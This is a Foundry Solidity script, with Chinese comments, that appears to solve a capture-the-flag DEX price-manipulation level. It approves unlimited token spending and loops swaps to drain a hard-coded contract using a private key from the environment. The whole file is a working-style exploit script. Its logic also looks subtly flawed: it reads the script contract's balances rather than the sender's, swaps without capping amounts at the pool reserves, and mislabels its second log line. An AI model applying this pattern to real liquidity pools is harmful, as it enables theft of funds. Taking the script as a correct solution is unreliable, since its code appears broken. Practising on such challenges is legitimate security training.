// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/22-Dex.sol"; 
// 此题目的目标是让您破解下面的基本合约并通过价格操纵窃取资金。

// 一开始您可以得到10个token1和token2。合约以每个代币100个开始。

// 如果您设法从合约中取出两个代币中的至少一个，并让合约得到一个的“坏”的token价格，您将在此级别上取得成功。

// 注意： 通常，当您使用ERC20代币进行交换时，您必须approve合约才能为您使用代币。为了与题目的语法保持一致，我们刚刚向合约本身添加了approve方法。因此，请随意使用 contract.approve(contract.address, <uint amount>) 而不是直接调用代币，它会自动批准将两个代币花费所需的金额。 请忽略SwappableToken合约。

//   可能有帮助的注意点：

// 代币的价格是如何计算的？
// approve方法如何工作？
// 您如何批准ERC20 的交易？
contract Exp is Script {

    Dex public DexInstance = Dex(payable(0xeCeA6C2B70C1491CDd5CE0b083501E57FEB40BdA));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS"); 
    // Exploit public attackContract;
    IERC20 public token1;
    IERC20 public token2;

    function attack() public {
        // 获取两个代币地址
        token1 = IERC20(DexInstance.token1());
        token2 = IERC20(DexInstance.token2());

        console.log("Token1:", address(token1));
        console.log("Token2:", address(token2));

        // 授权
        token1.approve(address(DexInstance), type(uint256).max);
        token2.approve(address(DexInstance), type(uint256).max);

        // 循环交换直到将两个代币池清空
        while (token1.balanceOf(address(DexInstance)) > 0 && token2.balanceOf(address(DexInstance)) > 0) {
            if (token1.balanceOf(address(this)) > 0) {
                uint256 amountToSwap = token1.balanceOf(address(this));
                DexInstance.swap(address(token1), address(token2), amountToSwap);
            } else {
                uint256 amountToSwap = token2.balanceOf(address(this));
                DexInstance.swap(address(token2), address(token1), amountToSwap);
            }
        }

        console.log("ok token1:", token1.balanceOf(address(DexInstance)));
        console.log("ok token1:", token2.balanceOf(address(DexInstance)));
    }

    function run() external {
        vm.startBroadcast(hacker);
        attack();
        vm.stopBroadcast();
    }
}